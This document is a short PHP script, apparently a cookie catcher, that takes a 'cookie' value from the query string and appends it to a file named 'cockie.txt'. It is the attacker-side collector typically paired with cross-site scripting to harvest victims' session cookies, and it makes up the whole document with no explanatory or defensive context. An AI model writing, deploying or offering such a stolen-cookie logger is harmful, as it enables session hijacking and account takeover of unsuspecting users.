<?php
$cookie = $_GET["cookie"];
$file = fopen('cockie.txt', 'a');
fwrite($file, $cookie . "\n");
?>
